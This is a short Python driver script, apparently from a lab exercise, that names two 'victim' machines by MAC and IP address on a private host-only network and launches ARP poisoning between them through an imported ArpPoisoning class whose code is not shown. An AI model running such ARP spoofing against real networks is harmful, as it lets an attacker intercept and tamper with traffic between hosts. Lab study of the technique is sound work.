from arppoisoning import ArpPoisoning

#victim1
macWindows = "08:00:27:b7:c4:af"
ipWindows = "192.168.56.101"

#victim2
macServer = "08:00:27:cc:08:6f"
ipServer = "192.168.56.102"

if __name__ == "__main__":
    arp_module = ArpPoisoning(ipWindows, ipServer)
    arp_module.execute_poisoning()
